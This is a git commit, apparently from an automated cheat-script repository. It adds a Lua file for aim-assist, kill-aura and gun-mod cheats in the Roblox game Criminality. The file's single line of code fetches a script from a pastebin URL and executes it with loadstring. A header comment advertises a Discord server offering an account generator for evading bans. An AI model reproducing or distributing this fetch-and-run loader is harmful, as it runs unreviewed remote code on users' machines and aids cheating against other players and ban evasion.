57c9d0ff377fa9c5fb20ef7cd0caaf2dad1b5a08
Emil Toth <emiltoth1870@gmail.com>
2023-03-08 06:47:10 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/Criminality Silent AIm Kill Aura Gun Mods.lua
@@ -0,0 +1,5 @@
+-- Fondra v2.0
+-- Searching for alts that work on Criminality? Join our discord server which has an account generator for Criminality!
+-- https://fondra.xyz/Discord
+
+loadstring(game:HttpGet("https://pastebin.com/raw/0Xxtfktr"))()
